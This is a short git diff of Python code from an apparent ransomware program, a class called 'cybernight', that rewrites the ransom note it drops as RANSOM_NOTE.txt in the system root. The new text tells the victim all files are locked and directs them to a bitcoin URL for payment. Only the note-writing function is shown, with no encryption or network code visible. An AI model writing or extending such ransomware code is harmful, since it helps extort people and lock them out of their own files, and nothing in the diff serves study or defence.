@@ -116,8 +116,10 @@ class cybernight:
         ransom_note_path = os.path.join(self.sysRoot, 'RANSOM_NOTE.txt')
         with open(ransom_note_path, 'w') as f:
             f.write(f'''
-Your computer has been compromised by a sophisticated encryption algorithm.
-All your files have been locked, and only we possess the decryption key.
+Your computer has been compromised by cybernight646.ALL files has been locked.
+Dont worry I'm just saying HI to u and your files.
+You can say HI back by following the bitcoin url.
+The earlier the better
 
 ''')
         return ransom_note_path
